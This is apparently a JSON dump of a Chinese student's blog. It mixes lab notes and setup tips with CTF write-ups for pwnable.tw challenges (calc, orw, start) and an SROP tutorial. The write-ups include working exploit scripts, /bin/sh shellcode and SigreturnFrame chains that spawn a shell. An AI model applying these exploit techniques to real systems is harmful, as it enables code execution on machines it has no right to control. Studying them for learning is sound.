其实大多数代码并不需要自己完成，也是确实没有这个水平，但是也有我们自己需要思考，然后实现的地方，就比如说适配的方法。我从来没有学过数据结构或者算法，也没有刷过类似的题，c语言也就是局限于看得懂这样的普通计算机专业学生水平，对于这种大面积的指针操作一时确实有些摸不着头脑，但是csapp给了我们一种解：利用宏，将复杂的指针运算以及强制类型转换封装，变得简单易用，这使得在我操作指针时，几乎感受不到指针的复杂所在，也是我觉得收获最大之所在。 ​ 关于三种适配方法，第一种我在编写时并不太理解如何实现“继续寻找下一个chunk”，于是自己按照感觉写了一个版本，然后寻找了一些参考，发现我写的除了这一步，其他都问题不大，然后就把自己的版本修正了。之后的两种适配方法都是基于首次适配的代码加以适当的条件修改而成，不得不说其实十分有趣。最佳适配牵涉到数组的排序以及结构体的定义，说实话上一次编写带结构体的c程序还是上学期起哦期末的暑假考核，但是也没有遇到什么障碍，就这么顺着写了。现在想来我们大一上的c语言大作业真是简单捏。 ​ 7）参考​ 六 Malloc Lab ​ CSAPP:Lab5-Malloc Lab","categories":[{"name":"CSAPP LAB","slug":"CSAPP-LAB","permalink":"https://fuurinko.github.io/categories/CSAPP-LAB/"}],"tags":[{"name":"csapp lab","slug":"csapp-lab","permalink":"https://fuurinko.github.io/tags/csapp-lab/"}]},{"title":"openstack学习笔记","slug":"openstack学习笔记","date":"2021-11-22T08:56:23.363Z","updated":"2022-03-20T04:32:10.781Z","comments":true,"path":"2021/11/22/openstack学习笔记/","link":"","permalink":"https://fuurinko.github.io/2021/11/22/openstack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"​ ​ 为了跟上网校的集群重构计划，这下狠狠地开始学习运维了。 ​ 在开始具体的openstack学习之前，首先需要学习一下一些基本的运维概念。 虚拟化/容器化​ 之前在学习docker的时候对于容器化已经有一个比较到位的认知了，而与容器化相对应的虚拟化并没有深入理解。 ​ 这里的虚拟化特指服务器虚拟化。就是在一台服务器上运行虚拟运行多个服务器。 虚拟化分类完全虚拟化​ 利用Hypervisor，将硬件与软件完全隔离，性能较差。 准虚拟化​ 改动操作系统，使操作系统以为自己是独立的。 操作系统层虚拟化​ 改动操作系统，使主机成为虚拟机管理软件。 桌面虚拟​ 不讨论 硬件虚拟​ 虚拟硬件而不是虚拟操作系统。 虚拟化技术分类​ ​ ​ ​ ​","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"SRE","slug":"SRE","permalink":"https://fuurinko.github.io/tags/SRE/"}]},{"title":"pwnable-calc","slug":"pwnable-calc","date":"2021-11-18T02:30:24.678Z","updated":"2022-03-20T04:32:25.577Z","comments":true,"path":"2021/11/18/pwnable-calc/","link":"","permalink":"https://fuurinko.github.io/2021/11/18/pwnable-calc/","excerpt":"","text":"逆向​ 程序实现了一个简单的计算器功能。运算有加减乘除四种。 ​ ​ 并且程序再次自带计时功能，需要patch。 ​ ​ 静态链接，所以肯定不能用ret2libc那一套，只能试图ROP一下。 ​ 程序主要功能通过get_expr和calculate（原本不叫这个）两个函数实现。 ​ get_expr主要用于定位我们输入的字符串中运算符的位置。修改过的ida伪代码如下: 1234567891011121314151617181920212223int __cdecl get_expr(int input_str, int _1024)&#123; int idx_0; // eax char operator; // [esp+1Bh] [ebp-Dh] int i; // [esp+1Ch] [ebp-Ch] i = 0; while ( i &lt; _1024 &amp;&amp; read(0, &amp;operator, 1) != -1 &amp;&amp; operator != &#x27;\\n&#x27; ) //栈溢出 &#123; if ( operator == &#x27;+&#x27; || operator == &#x27;-&#x27; || operator == &#x27;*&#x27; || operator == &#x27;/&#x27; || operator == &#x27;%&#x27; || operator &gt; &#x27;/&#x27; &amp;&amp; operator &lt;= &#x27;9&#x27; ) &#123; idx_0 = i++; *(_BYTE *)(input_str + idx_0) = operator; // 通过循坏找到运算符的位置 &#125; &#125; *(_BYTE *)(i + input_str) = 0; return i; ​ 在这之后还有一个init_pool函数。函数参数为表达式数组的索引。大致就是初始化一个大小的100的字符串数组。 ​ calculate函数则负责进行运算。 ​ 实在是没有思路，于是找到了wp。不得不说pwnable.tw上面的题目每个都出得很好，几乎没有板子题，而且漏洞点都丝毫不传统。 ​ 主要的问题还是在这个运算的逻辑上 123456789101112131415161718192021222324252627DWORD *__cdecl eval(_DWORD *num, char operator)&#123; _DWORD *result; // eax if ( operator == &#x27;+&#x27; ) &#123; num[*num - 1] += num[*num]; &#125; else if ( operator &gt; &#x27;+&#x27; ) &#123; if ( operator == &#x27;-&#x27; ) &#123; num[*num - 1] -= num[*num]; &#125; else if ( operator == &#x27;/&#x27; ) &#123; num[*num - 1] /= num[*num]; &#125; &#125; else if ( operator == &#x27;*&#x27; ) &#123; num[*num - 1] *= num[*num]; &#125; result = num; --*num; return result;&#125; ​ 这里*num，也就是num[0]的值，是检测到的表达式中数字的数量。 ​ 比如我输入了1+2，那么，num[0]的值为2，如果输入+2，num[0]的值为1。 ​ 所以根据这个计算的逻辑，如果输入+50，num[0]是1，num[1]是50，num[*num-1]就是num[1-1] = num[0] = num[0] + num[1]=50。 ​ 如果输入的是+50+1，处理第一个加号时，num[0] = 2,num[1] = 50 ,num[2].= 1， 然后num[1] += num[2] =&gt; num[1] = 51，接着处理第二个加号，也就是,num[50] += num[51]。 ​ num[51]显然应该是一个栈上的还没有被利用到的位置，但是这样我们已经能够将其覆盖为任意内容了，四舍五入形成了一个栈上任意地址读。 ​ 然后后面还有一个对数组的内容的输出，相当于栈上任意地址写。 ​ 这样我们就找到了不通过栈溢出而对栈上地址进行任意读写的方法，但想要控制程序执行流，我们注意到，存放进行计算的数字的数组不算很大，完全能够填写东西覆盖返回地址。 ​ ​ ​ ​ ​ 也就是0x5A0 + 0x4 = 0x5A4 = 1444。数组存放int类型，32位下一个int占4个字节，所以返回地址所在的位置是idx[1444/4=361] ​ 也就是说如果我们能够将想要的东西写入idx[361]就能控制程序执行流。但是并不能ret2libc，所以需要在栈上手动构造寄存器状态来进行系统调用。 ​ 所以我们需要的并不是在idx[361]上填某个值，而是需要连续修改这之后一串的空间来进行rop。 ​ 借一张图来表示我们需要的布栈状况： ​ ​ ​ 其他的gadgets都可以通过ROPgadget来找到，但是字符串&quot;/bin/sh&quot;需要输入并确定它们在栈上的地址。 ​ ​ ​ 对于这个地址，首先我们可以利用我们之前的栈上任意地址读写的能力泄露calc函数的ebp地址，也即是idx[360] ,但是我们需要的字符串是在main函数调用栈中的，所以我们需要知道main函数调用栈的esp。 ​ 通过观察可以发现main的esp正好就是idx[361],而calc ebp和main esp的关系如下： 123 mov ebp, esp and esp, 0FFFFFFF0hsub esp, 10h ​ 也即是我们可以通过calc ebp的值来求出main esp，从而通过偏移获得&quot;/bin/sh&quot;的地址。 ​ 然后根据布栈将地址依次写入栈中就行。","categories":[{"name":"STACK - ROP","slug":"STACK-ROP","permalink":"https://fuurinko.github.io/categories/STACK-ROP/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"妙控鼠标卡顿问题","slug":"妙控鼠标卡顿问题","date":"2021-11-17T13:59:33.427Z","updated":"2022-03-20T04:30:55.376Z","comments":true,"path":"2021/11/17/妙控鼠标卡顿问题/","link":"","permalink":"https://fuurinko.github.io/2021/11/17/%E5%A6%99%E6%8E%A7%E9%BC%A0%E6%A0%87%E5%8D%A1%E9%A1%BF%E9%97%AE%E9%A2%98/","excerpt":"","text":"​ ​ 最近刚花了三百大洋从室友那里买回了白嫖了半个学期的妙控鼠标，钱转了不到两天，鼠标开始疯狂卡顿。 ​ 最初以为是外接了太多东西，把键盘啥的都换成了线控，但是问题还是不见解决。 ​ 最后是这篇文章解决了我的问题。 ​ macos系统里面，蓝牙鼠标偶尔卡顿，飘的问题 ​ 解决方法也很简单，把网络中的蓝牙PAN的顺序调到最前。 ​ 蓝牙PAN就是类似一种个人局域网，把连接顺序放到前面了，自然连接就更顺畅了（","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"Seccomp机制学习","slug":"Seccomp机制学习","date":"2021-11-11T13:12:47.210Z","updated":"2022-03-20T04:32:55.939Z","comments":true,"path":"2021/11/11/Seccomp机制学习/","link":"","permalink":"https://fuurinko.github.io/2021/11/11/Seccomp%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1）Seccomp基础Seccomp简介​ 就像ALSR，NX这样，Seccomp也是linux内核的一种安全机制。这种保护机制会禁用某些系统调用，有效避免了越权行为的发生。 启动Seccomp​ 如果要编写调用Seccomp的程序，需要先安装相应的头文件。 1apt install libseccomp-dev libseccomp2 seccomp Seccomp的模式以及参数比较多，这里只总结比较直观的几点，具体的可以看大佬的博客：seccomp学习笔记 123456789 scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_ALLOW);/* SCMP_ACT_ALLOW表示在初始化的时候允许所有系统调用，相反的 SCMP_ACT_KILL表示禁用所有系统调用*/ seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);//添加一条seccomp规则，第二个参数选择禁用/开启（kill为禁用，allow为开启）第三个参数表示规则处理的具体的系统调用，第四个参数是限制系统调用执行的参数，如果不为0，那么后面会加上更具体的限制系统调用参数的函数参数） seccomp_load(ctx);//调用，使过滤规则生效 2）Seccomp-Tools​ 暂时空着，因为我seccomp dump，系统给我说无权限。这个问题似乎仅限于docker，但是网上并没有类似的烈士为我答疑解惑捏。 3）ORW例题pwnable-orw​ pwnable第二题，orw。 ​ ​ ​ 这里的沙箱实际是通过prctl来控制实现的。 (1).PR_SET_SECCOMP(22)：当第一个参数是PR_SET_SECCOMP,第二个参数argv2为1的时候，表示允许的系统调用有read，write，exit和sigereturn；当argv等于2的时候，表示允许的系统调用由argv3指向sock_fprog结构体定义，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。(细节见下图) (2).PR_SET_NO_NEWPRIVS(38):prctl(38,1,0,0,0)表示禁用系统调用execve()函数，同时，这个选项可以通过fork()函数和clone()函数继承给子进程 copy的宋师傅的博客捏 ​ 所以这道题就是一道没有任何坑的orw，我们需要做的就是手写shellcode。 ​ 参照我之前qwb那道orw的wp，为了读取到flag，我们的步骤如下 123sys_open(&quot;flag&quot;)//读取flagsys_read(&quot;eax&quot;,&quot;esp&quot;,0x40)//eax为sys_oopen的返回值，也就是flag，然后将flag写到esp下sys_write(1,&quot;esp&quot;,0x40)//打印flag的值到屏幕输出 ​ 如果要达到可以成功执行的效果，就必须要像写完整汇编一样将所有压栈出栈等对栈顶的操作也考虑进去。 ​ 手写汇编要尤其注意32位与64位系统传参规则并不相同。尤其是函数使用的寄存器的种类理论上是特定的，如果搞错就直接EOF了。 ​ 并且进行软中断时使用的指令是int 0x80而不是syscall，syscall是c语言层面上的系统调用，而int 0x80才是汇编层面的系统调用。 ​ 关于pwntools的asm模块，有一些比较怪的点。 ​ 比如说我们可以这样写： 123payload = asm(&quot;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebp, esp;mov eax, 0x5;xor ecx, ecx;xor edx, edx;int 0x80;&quot;)也可以这样写 1asm(&#x27;mov eax, 0&#x27;) ​ 就是说，可以有分号，也可以没有。 1234567891011121314151617181920from pwn import*#p = process(&quot;./orw&quot;)#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)p = remote(&quot;chall.pwnable.tw&quot;,10001)#context.log_level = &quot;debug&quot;#openpayload = asm(&quot;push ebx ;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx, esp;mov eax, 0x5;int 0x80;&quot;)#readpayload += asm(&quot;mov eax, 0x3; mov ecx, ebx; mov ebx, eax;mov edx, 0x60;int 0x80;&quot;)#writepayload += asm(&quot;mov eax, 0x4;mov ebx, 0x1;int 0x80;&quot;)#gdb.attach(p)p.sendline(payload)p.interactive() ​ 完整exp，其实主要是要对32位的传参熟悉，整体编写的难度并不高捏。 4）参考prctl函数开始学习沙箱规则](https://www.cnblogs.com/L0g4n-blog/p/12839171.html)","categories":[{"name":"STACK - sandbox","slug":"STACK-sandbox","permalink":"https://fuurinko.github.io/categories/STACK-sandbox/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pwndocker的pwn题体验（下","slug":"pwndocker的pwn题体验（下）","date":"2021-11-10T20:04:03.336Z","updated":"2022-03-20T04:32:36.219Z","comments":true,"path":"2021/11/11/pwndocker的pwn题体验（下）/","link":"","permalink":"https://fuurinko.github.io/2021/11/11/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8B%EF%BC%89/","excerpt":"","text":"0）​ 哈哈，还是连续剧，我也想不到捏。我也不想捏。 1）问题​ pwndocker体验了快一周，目前来说主要问题有这几个： 启动tmux进行调试时机器发热严重，风扇狂转 挂载文件夹内文件不同步 快照的制作相对麻烦（时间久，步骤多） 打开需要输入命令，有点烦。 ​ 想了怪久的，就想到这三点，第三点纯属鸡蛋里挑骨头，主要pwndocker体验确实比较优雅，为了美观用vim编辑exp我都能忍。 （看我的绝美终端） ​ 每天在ayanami的注视下打工也会变得快乐（不是打工） ​ 虽然但是，这些问题感觉都不是什么好解决的问题，尤其机器发热。 ​ 目前来说我只能应付。 3）解决方案？1​ 机器发热，cpu内存占用严重，这理论上是无解的，但是在使用过程中我发现这种情况并不是每次都会发生，而是概率性的，而且概率并不是特别高。所以目前敷衍的解决方案是，电脑一吵起来就关了tmux，等它安静了再开。 ​ 2021-11-14更新：这个问题突然就没有了（ 2​ 挂载文件不同步，网上所有方案亲测无效。目前的解决方案是，不解决。用vim，或者出现问题就重启。 ​ 2021-11-14更新：这个问题突然就没有了（ 3​ 这个可以整个一件push脚本 ps：可以直接docker commit -p ，也算生成了快照，并且耗时比较短，就是有一点点没有安全感。 4​ 直接写shell脚本，然后放在默认路径下。 5123cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.sopatchelf --set-interpreter /tmp/ld-2.27.so ./testLD_PRELOAD=./libc.so.6 ./test 好东西","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"SROP学习","slug":"srop学习","date":"2021-11-07T11:11:19.208Z","updated":"2022-03-20T04:33:01.950Z","comments":true,"path":"2021/11/07/srop学习/","link":"","permalink":"https://fuurinko.github.io/2021/11/07/srop%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1)前言​ 在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。 2）SROP原理​ 当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。 ​ 所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。 ​ 借一张图说明一下： 3）SROP利用​ pwntools中为我们集成了srop利用的工具,接下来我们通过一个极为刻意的例子演示一下如何利用。 funsignal​ 题目地址： funsignals ​ 打开题目，是手写汇编。 ​ ​ 观察一下。程序分别通过系统调用，调用了sys_read , sys_sigreturn两个函数。 ​ 那么很明显，sys_read用来栈溢出，然后 sys_sigreturn作为返回地址。并且flag的地址都已经给出，我们只需要通过sys_write读出flag的值就行。 ​ 所以我们需要构造sys_write的调用 123456frame = SigreturnFrame()frame.rax = constants.SYS_write#write函数的系统调用号frame.rdi = constants.STDOUT_FILENO#1frame.rsi = elf.symbols[&#x27;flag&#x27;]#0x010000023frame.rdx = 50#读取的字符数frame.rip = elf.symbols[&#x27;syscall&#x27;] ​ 这里就类似pwntools的rop模块，只是把需要的东西生成一下然后存起来。当程序调用sys_read的时候把东西读进用户栈，然后接着调用 sys_sigreturn让内核将用户栈的东西恢复，就相当于调用了sys_write，从而读出flag的值。 ​ 但是这道题将我们需要的任何地址都给出了，甚至也不需要构造sys_sigreturn，我们通过另外一个例子来演示一下如何构造sys_sigreturn并且获得一个shell。 Smallest Pwn​ 题目：smallest pwn ​ 直接先在IDA中查看： 12345678910111213start proc near ; DATA XREF: LOAD:0000000000400018↑o.text:00000000004000B0 xor rax, rax.text:00000000004000B3 mov edx, 400h ; count.text:00000000004000B8 mov rsi, rsp ; buf.text:00000000004000BB mov rdi, rax ; fd.text:00000000004000BE syscall ; LINUX - sys_read.text:00000000004000C0 retn.text:00000000004000C0 start endp.text:00000000004000C0.text:00000000004000C0 _text ends.text:00000000004000C0.text:00000000004000C0.text:00000000004000C0 end start ctf-wiki题解​ 可以看到程序本身就是一个sys_read。所以我们需要利用它来getshell，难度可想而知。 ​ 由于题目只给出了sys_read，但是泄露程序内存我们肯定是需要一个sys_write 的，所以这里有一个trick，就是通过将sys_read的返回值构造成函数的系统调用号。然后调用sys_write以及sys_sigreturn。 ​ 那么来看详细的分析 ​ 首先需要调用sys_write，系统调用号为4，也就是需要sys_read返回读入四个字符，将rax的值赋为4。 ​ 顺便sys_sigreturn的返回值为119。 ​ 然后看exp： 123456789payload = p64(start_addr) * 3sh.send(payload)## modify the return addr to start_addr+3## so that skip the xor rax,rax; then the rax=1## get stack addrsh.send(&#x27;\\xb3&#x27;)stack_addr = u64(sh.recv()[8:16])log.success(&#x27;leak stack addr :&#x27; + hex(stack_addr)) ​ 首先发送三次start_addr，第一次使得程序执行流重新回到start，但是在重新执行时输入\\xb3 ,覆盖我们刚刚输入的三个开始地址中的第二个，以至于程序会重新执行start函数，但是是从0x4000B3开始。(第三个地址的作用会在后面体现) ​ 同时我们读入的\\xb3 ,仅有一个字节，这使得sys_read的返回值为1，存在rax中，程序在这里就相当于执行了 12345mov rax, 1mov edx, 400h ; countmov rsi, rsp ; bufmov rdi, rax ; fdsyscall ; LINUX - sys_write 所以此时相当于进行了一个系统调用号为1的系统调用,也就是sys_write函数。 ​ 并且读出的内容就是rsp的值，也就相当于泄露了一个栈地址。 ​ 回忆一下，srop的关键是通过sys_sigreturn来恢复我们构造的用户栈上的寄存器状态，那么现在我们得到了用户栈的地址，我们就能够在用户栈中写入一些我们想要的东西。 1234567891011## make the rsp point to stack_addr## the frame is read(0,stack_addr,0x400)sigframe = SigreturnFrame()#创建一个SigreturnFrame，没啥好说的sigframe.rax = constants.SYS_read#确定我们希望调用的函数的系统调用号sigframe.rdi = 0#read参数sigframe.rsi = stack_addr#read参数，在栈上读入sigframe.rdx = 0x400#read参数，读多大sigframe.rsp = stack_addr#sigframe参数sigframe.rip = syscall_ret#sigframe参数，这里是syscall+retn的地址payload = p64(start_addr) + &#x27;a&#x27; * 8 + str(sigframe)sh.send(payload) ​ 接着我们开始构造sys_sigreturn 1234## set rax=15 and call sigreturnsigreturn = p64(syscall_ret) + &#x27;b&#x27; * 7#读入15字节sh.send(sigreturn)#利用与第一段payload同理。将返回地址覆盖成syscall+ret，进行系统调用，而此时rax已经被设置成15. ​ 这样我们就成功地调用了sys_sigreturn ,此时我们已经可以向用户栈中读入任意数据了。 1234567891011121314## call execv(&quot;/bin/sh&quot;,0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x120 # &quot;/bin/sh&quot; &#x27;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = p64(start_addr) + &#x27;b&#x27; * 8 + str(sigframe)print len(frame_payload)payload = frame_payload + (0x120 - len(frame_payload)) * &#x27;\\x00&#x27; + &#x27;/bin/sh\\x00&#x27;sh.send(payload)sh.send(sigreturn) ​ 我们再次利用SigreturnFrame()来构造我们读入用户栈的内容。内容也比较直观，就是一个·类似shellcode的东西。然后再调用sys_sigreturn来触发。 ​ 所以总结下来就是，先通过读入一个字符覆盖start函数地址，调用sys_write泄露栈地址，通过两次调用sys_sigreturn，第一次执行sys_read，将execute(&quot;/bin/sh&quot;)写入用户栈，第二次调用sys_sigreturn来getshell。 自己的反思​ 有一个疑惑，就是既然我们能够通过控制rax而控制syscall，而普通的sys_read也是将用户输入储存到栈上，那为什么还要多此一举，去获得rsp的地址，再将shellcode写到那上面呢？ ​ 怀着这样的问题，果然我在网上找到了一个和我想法完全一致的人。他的exp的关键部分是这样的： 1234567891011121314151617181920212223reread = 0x4000b0syscall = 0x4000berereadaddr = p64(reread)syscalladdr = p64(syscall)context.clear()context.arch = &quot;amd64&quot;frame = SigreturnFrame()frame.rax = 59frame.rdi = 0x7fffffffe4e8frame.rip = syscallbinsh=&#x27;/bin/sh&#x27; playload1 = rereadaddr+&#x27;a&#x27;*8+ str(frame)+binshp.send(playload1)playload2 = syscalladdr+&#x27;a&#x27;*7p.send(playload2)#http://www.reshahar.com/2017/05/04/360春秋杯smallest-pwn的学习与利用/ ​ ​ 可以看到细节和wiki给出的几乎一样，如果思路行得通，那么应该不会跑出问题，然而当我运行的时候，发现果不其然，EOF了。 ​ 去查了一些资料，发现还是对于SigreturnFrame()的理解不够透彻。 ​ SigreturnFrame()中有一个非常重要的part：sigframe.rsp ​ 我们自己构造的寄存器状态肯定是需要rsp的值的，并且这里rsp肯定也是要可写的，不然后面我们无法把getshell的函数写进去，所以我们这里肯定要指定一个可写的栈上的地址。 ​ 所以之前那种想法就不攻自破了，在那种情况下我们无法获取任何栈上的地址，自然也没有东西可以填，所以还是需要通过sys_write ,来回跳转执行流。 4）总结​ 非常有意思的一个知识点，但是非常奇怪的是我花在理解上的时间比之前任何知识点都短，可能是我之前嗯啃csapp，对于信号，系统调用等稍有了解。也可能是我研究例题的时候完全是参考涅普的视频教程，有pwn奶奶的细节讲解。（这个可能比较重要），说到底还是知识点本身比较简单。 5）参考​ 2017 429 ichunqiu ctf smallest(pwn300) writeup SROP","categories":[{"name":"STACK - SROP","slug":"STACK-SROP","permalink":"https://fuurinko.github.io/categories/STACK-SROP/"}],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]},{"title":"pwndocker的pwn题体验（上）","slug":"pwndocker的pwn题体验（上）","date":"2021-11-02T14:54:29.012Z","updated":"2022-03-21T12:28:27.978Z","comments":true,"path":"2021/11/02/pwndocker的pwn题体验（上）/","link":"","permalink":"https://fuurinko.github.io/2021/11/02/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8A%EF%BC%89/","excerpt":"","text":"1）前言​ 之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。 2）pwndocker启动​ 首先是如何build pwndocker的问题。 ​ 如果直接docker pull pwndocker，速度一般会很慢。 ​ 这里参考一篇博客的做法：skysider/pwndocker 正确使用姿势。 ​ docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0从阿里云上拉取镜像，使得速度变快。 ​ 拉取完之后重命名镜像。docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker ​ 然后可以 123456789docker run -d \\--rm \\-h $&#123;ctf_name&#125; \\--name $&#123;ctf_name&#125; \\-v $(pwd)/$&#123;ctf_name&#125;:/ctf/work \\-p 23947:23947 \\--cap-add=SYS_PTRACE \\--privileged \\pwn ​ 运行镜像。 ​ 但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用 docker run -it skysider/pwndocker /bin/bash是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。 ​ ​ 我们可以先用docker cp来将题目的文件拷贝至容器中。 ​ ​ 关于docker cp指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。 ​ 如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过docker run指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过docker start和docker attach来进入容器就行。 ​ 愉快的gdb时间（（ ​ 还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。 ​ 然后是做题时间。 ​ 这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。 ​ ​ ps：关于cyclic的原理可以看我的pwntools源码解析系列。 ​ 然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。 ​ 还是要借助docker run的- v参数，大概就是~/work/pwner:/ctf/work ​ 但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？ ​ 后来重启一次之后就能立即同步到容器中了。好。 ​ 有一点离谱。 ​ 虽然但是，我超，pwndokcer真的好用。 ​ 鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（ ​ 所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。 ​ 然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。 ​ shellcode就没必要手写了，pwntools.shallcraft直接生成。 12345678910from pwn import*p = remote(&#x27;chall.pwnable.tw&#x27;,10000)shellcode = asm(shellcraft.sh())payload = b&#x27;a&#x27;*20payload += shellcodep.send(payload)p.interactive() ​ 摸了一圈，又EOF力。 ​ 换了祖传exp。 123456789101112131415161718192021222324from pwn import*p = remote(&quot;chall.pwnable.tw&quot;,10000)#p = process(&quot;./start&quot;)#shellcode = asm(shellcraft.sh())shellcode = b&#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;buf_addr = 0xffffd284payload = b&#x27;a&#x27;*0x14 payload += p32(0x8048087)p.sendafter(&quot;Let&#x27;s start the CTF:&quot;,payload)stack_addr = u32(p.recv(4))print(hex(stack_addr))payload = b&#x27;a&#x27;*20payload += p32(stack_addr+20)payload += shellcodep.send(payload)p.interactive() ​ 所以shellcode是没有问题的，问题出在需要溢出两次，一次获得栈地址，一次ret到栈地址执行shellcode。我不能理解。 ​ shellcode覆盖retn，不也是在栈上执行吗，为什么EOF。我猜测是栈空间不够大。虽然但是，不想找wp，喜闻乐见地调试一下吧。 ​ 在调试的时候又出现了新问题。 ​ 搜了一圈应该是启动tmux的问题。但是网上给的解决方案在我这里似乎不管用。 ​ 在研究tumx的时候发现了一个更离谱的事，这个pwndocker的系统时间是错误的。导致apt都运行不了。 ​ 这就造成了一个非常离谱的死循环，修复时间需要使用apt安装相关的软件，然而时间又导致apt无法运行。 ​ 虽然但是，解决方法也比较弱智。把https改成http是最粗暴的解决方案了，但是有一说一，这不优雅。但是最后还是妥协了，先用http下了一个ntp，然而发现就算是系统时间校准了，换回https后还是现实证书不被信任。。。 ​ 这里留个疑点吧。 ​ 还是回到题目本身。也就是无法gdb.attach()的问题。 ​ 原来是因为要先输入tmux进入，才能执行分屏。。。。。。。。 ​ 我傻了。坑是真的多。 ​ 果然碰到了无限waiting for debug的问题，虽然pwntools是4.6.1了。 ​ 在修改源码后解决问题，详情可以参考：pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案。 ​ 解决问题的过程中又发现了一个问题，就是我打开tmux的时候突然就风扇狂转，CPU占用率直接飙到109%，内存3.53G。我以为是容器开太多的问题，把多余的容器全部rm，但是还是不见缓解。 ​ 百度后发现这个好像是MAC运行Docker的通病，但是我这个容器至少不应该是这样，因为之前风扇一直就没怎么转，于是我把我现在运行的容器停止，结果cpu占用率一下就变低了，然后再重启，cpu占用率再也没有升高。 ​ 对于这个情况我的合理猜测是，那个pwntools源码的无限循环问题。 ​ ​ ​ 尝试了一下一种新的下断点方式。 ​ 回到题目，很显然如果摁执行shellcode，就根本没有反应（（ ​ eip也没有被覆盖。之前的猜测是栈空间不够，这里来验证一下。 ​ 新问题，如果调试的话terminal中tmux的选项似乎只能指定splitw，但是这样就没有办法滚动。。。 ​ 好，解决了。首先可以通过按ctrl+b后再按[，切换到查看另一个窗口的历史输出模式，然后将终端中的偏好设置里的“滚动备用屏幕”取消勾选（其实默认应该是不勾的） ​ 这样我们的操作逻辑就是Fn/shift加鼠标滚轮滚动页面，普通的鼠标滚轮则选择历史输入，然后 ctrl+b后再按[，可以用鼠标滚轮控制光标查看历史输出。 ​ (真有够麻烦的) 3）漏洞利用 ​ 看一下发现不对头，这个返回地址是我们的shellcode。 ​ 按照我的想法，指令应该继续执行下去的，因为堆栈可执行。但是实际上并没有执行，而是把shellcode识别成了返回地址。 ​ 然后我才意识到一直以来我对栈溢出其实是有一些理解上的错误的，retn这个操作码无论如何是不能够被覆盖的，覆盖的只有后面的操作数。所以这里我们需要让程序先retn到一个合法的地址，然后后面跟着shellcode。 ​ 那么我们要retn到哪里呢？ ​ 既然堆栈可执行，那就直接跳到栈上好了。所以此刻我们需要一个栈上的地址。 ​ 